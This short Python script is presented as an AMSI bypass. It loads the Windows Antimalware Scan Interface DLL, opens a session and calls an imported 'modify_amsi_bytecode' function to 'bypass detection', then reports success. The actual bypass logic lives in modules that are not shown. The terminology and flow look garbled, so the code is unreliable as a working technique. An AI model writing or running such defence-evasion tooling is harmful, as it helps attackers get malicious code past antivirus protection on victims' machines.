from amsi_bypass import modify_amsi_bytecode
from amsi_utils import get_amsi_dll, open_amsi_session, close_amsi_session

def main():
    # Load the AMSI DLL
    amsi_dll = get_amsi_dll()

    # Open an AMSI session
    session = open_amsi_session(amsi_dll)
    if not session:
        print("Failed to open AMSI session.")
        return

    # Modify the AMSI bytecode to bypass detection
    modify_amsi_bytecode()

    # Close the AMSI session
    close_amsi_session(amsi_dll, session)
    print("AMSI bypass applied successfully.")

if __name__ == "__main__":
    main()